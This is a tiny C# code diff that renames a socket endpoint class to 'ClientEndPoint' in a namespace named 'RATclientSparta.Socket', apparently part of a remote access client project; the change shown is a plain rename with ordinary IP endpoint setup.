@@ -7,7 +7,7 @@ using System.Threading.Tasks;
 
 namespace RATclientSparta.Socket
 {
-    public class EndPoint
+    public class ClientEndPoint
     {
         public static IPEndPoint Set(string ipaddress, int port)
         {
